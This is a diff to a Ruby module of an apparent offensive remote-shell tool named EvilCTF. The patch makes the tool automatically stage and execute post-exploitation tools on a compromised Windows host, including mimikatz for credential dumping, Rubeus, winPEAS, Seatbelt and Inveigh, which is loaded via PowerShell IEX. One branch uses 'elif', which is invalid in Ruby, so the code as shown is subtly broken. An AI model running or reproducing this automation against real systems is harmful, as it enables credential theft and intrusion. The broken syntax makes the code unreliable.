@@ -169,7 +169,52 @@ module EvilCTF::Session
                 EvilCTF::Tools.safe_autostage(tool_key, shell, session_options, logger)
               end
             else
-              EvilCTF::Tools.safe_autostage(key, shell, session_options, logger)
+              puts "[*] Staging tool: #{key}"
+              success = EvilCTF::Tools.safe_autostage(key, shell, session_options, logger)
+              if success
+                puts "[+] Tool '#{key}' staged successfully"
+                # Execute the tool based on its configuration
+                tool = EvilCTF::Tools::TOOL_REGISTRY[key]
+                if tool && tool[:recommended_remote]
+                  remote_path = tool[:recommended_remote]
+                  
+                  # For binary tools, execute them automatically
+                  if key == 'mimikatz'
+                    puts "[*] Executing mimikatz..."
+                    result = shell.run("#{remote_path} 2>$null")
+                    puts result.output
+                  elsif key == 'winpeas'
+                    puts "[*] Executing winpeas..."
+                    result = shell.run("#{remote_path} 2>$null")
+                    puts result.output
+                  elsif key == 'rubeus'
+                    puts "[*] Executing Rubeus..."
+                    result = shell.run("#{remote_path} 2>$null")
+                    puts result.output
+                  elsif key == 'seatbelt'
+                    puts "[*] Executing Seatbelt..."
+                    result = shell.run("#{remote_path} 2>$null")
+                    puts result.output
+                  elif key == 'inveigh'
+                    puts "[*] Executing Inveigh PowerShell script..."
+                    # For PowerShell scripts, we need to load them properly
+                    ps_script = "IEX (Get-Content '#{remote_path}' -Raw)"
+                    result = shell.run(ps_script)
+                    puts result.output
+                  else
+                    # For other binary tools, execute them directly
+                    if remote_path.end_with?('.exe')
+                      puts "[*] Executing #{key}..."
+                      result = shell.run("#{remote_path} 2>$null")
+                      puts result.output
+                    else
+                      puts "[*] Tool staged. Execute manually with: #{remote_path}"
+                    end
+                  end
+                end
+              else
+                puts "[-] Failed to stage tool '#{key}'"
+              end
             end
             next
           when /^!bash$/i, /^!sh$/i
